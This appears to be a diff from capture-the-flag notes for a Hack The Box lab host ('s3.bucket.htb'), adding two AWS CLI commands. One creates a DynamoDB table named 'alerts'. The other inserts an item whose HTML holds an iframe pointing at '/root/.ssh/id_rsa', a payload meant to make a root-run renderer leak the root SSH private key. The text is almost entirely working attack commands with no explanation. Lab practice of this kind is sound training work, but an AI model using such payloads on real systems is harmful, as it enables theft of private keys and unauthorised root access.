@@ -1,0 +1,5 @@
+aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://s3.bucket.htb
+
+
+
+aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"},"data": {"S": "<html><head></head><body><iframe src='/root/.ssh/id_rsa'></iframe></body></html>"}}' --endpoint-url http://s3.bucket.htb
